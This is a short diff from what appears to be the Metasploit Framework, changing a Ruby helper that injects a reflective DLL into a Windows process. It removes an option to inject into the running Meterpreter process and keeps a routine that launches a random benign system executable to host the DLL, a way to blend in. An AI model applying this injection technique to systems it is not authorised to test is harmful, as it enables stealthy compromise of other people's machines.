@@ -52,15 +52,9 @@ module Process
   #   then the value will be passed as is. If the value is nil, it'll be passed as a NULL pointer.
   # @param pid       [Integer] The process ID to inject to, if unspecified, a new instance of a random EXE from the
   #   process_list array will be launched to host the injected DLL.
-  # @param self_inject [Boolean] If set to true, then inject into the existing Meterpreter process. Otherwise, spawn
-  #   a random process from process_list and inject into it. Note that injecting into the existing Meterpreter process
-  #   will also elevate all sessions associated with that process.
-  def execute_dll(rdll_path, param=nil, pid=nil, self_inject=false)
+  def execute_dll(rdll_path, param=nil, pid=nil)
     process_list = ['sigverif', 'netsh', 'nslookup', 'winver', 'nbtstat -r 200', 'dxpserver', 'sndvol', 'netstat 200']
-
-    if self_inject
-      process = session.sys.process.open(client.sys.process.getpid.to_i, PROCESS_ALL_ACCESS)
-    elsif pid.nil?
+    if pid.nil?
       offset_num = rand(0..process_list.length-1)
       process_cmd = process_list[offset_num]
       print_status("Launching #{process_cmd} to host the DLL...")
